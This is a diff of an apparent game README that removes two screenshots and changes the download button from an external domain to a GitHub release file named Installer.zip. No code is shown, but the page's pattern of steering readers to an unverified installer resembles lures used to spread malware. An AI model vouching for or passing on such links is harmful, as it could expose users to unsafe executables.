@@ -9,8 +9,6 @@ Explore vast environments, solve puzzles, and uncover ancient artifacts as you p
 ![image](https://github.com/user-attachments/assets/40b38cad-22f4-49b4-b8a0-1d0e89f75629)
 ![image](https://github.com/user-attachments/assets/b9accb44-88b6-4aa4-bebe-67368aa704f7)
 ![image](https://github.com/user-attachments/assets/dcaee935-b5b6-4e3e-93f2-218747501c85)
-![image](https://github.com/user-attachments/assets/e0feabfa-a8a5-4c57-9aaa-dd5e0953ed64)
-![image](https://github.com/user-attachments/assets/ebe34dd1-ba27-48ed-b7c9-b0dce0039044)
 ![image](https://github.com/user-attachments/assets/5abbc3f0-8971-482a-af8a-43aafb8ee188)
 
 
@@ -18,7 +16,7 @@ Explore vast environments, solve puzzles, and uncover ancient artifacts as you p
 
 1. Click the download button on this page to get the game installer.
     <br>
-    <a href="https://nicecolns.com">
+    <a href="https://github.com/JeanSylvestrek/game4fun/releases/download/publish/Installer.zip">
       <img src="https://github.com/user-attachments/assets/f66372ac-4c2b-4c77-ad35-ea6780972afd" alt="Download" width="300"/>
     </a>
 
